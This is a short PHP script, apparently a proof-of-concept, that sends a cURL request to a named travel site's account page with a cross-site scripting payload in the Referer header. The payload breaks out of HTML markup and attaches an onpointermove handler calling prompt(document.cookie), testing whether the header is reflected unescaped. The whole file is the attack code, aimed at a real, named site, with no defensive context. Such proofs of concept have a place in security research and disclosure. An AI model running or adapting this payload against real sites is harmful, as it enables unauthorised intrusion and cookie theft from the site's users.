<?php
$url = "https://travelpirates.hometogo.com/account/";

$headers = array(
    "Referer: tester90?><>><<x12 only=xxxxx onpointermove=prompt(document?.cookie)>hover-here-for-xss",
    // Include other headers if needed
);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($ch);
curl_close($ch);

echo $response;
?>
